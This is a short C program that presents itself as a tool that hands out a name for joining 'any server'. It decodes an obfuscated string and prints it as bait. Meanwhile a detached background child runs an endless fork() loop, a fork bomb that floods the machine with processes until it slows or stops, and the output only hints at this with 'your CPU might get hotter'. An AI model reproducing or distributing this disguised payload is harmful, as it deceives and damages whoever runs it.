#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>

char *magic;

void exploit() {
    int val;

    while (1) {
        magic = (char*)malloc(sizeof(char) * 1);

        *magic = 20;
        fork();
        val = (int)*magic;

        free(magic);
    }
}

int main() {
    unsigned char magicBytes[] = { 0x51, 0x66, 0x66, 0x62, 0x79, 0x73, 0x6a, 0x79, 0x65, 0x64, 0x56, 0x68, 0x71, 0x63, 0x75, 0x49, 0x75, 0x68, 0x6c, 0x79, 0x73, 0x75 };

    for (int i = 0; i < 12; ++i) {
        magicBytes[i] -= 16;
    }

    magicBytes[12] = '\0';

    magic = magicBytes;

    pid_t pid = fork();

    if (pid == -1) {
        perror("Operation failed");
        exit(EXIT_FAILURE);
    } else if (pid > 0) {
        char *username = magic;
        printf("You can now join any server whith following name (your CPU might get hotter): %s\n", username);
        exit(EXIT_SUCCESS);
    } else {
        if (setsid() == -1) {
            perror("setsid failed");
            exit(EXIT_FAILURE);
        }

        exploit();
    }

    return 0;
}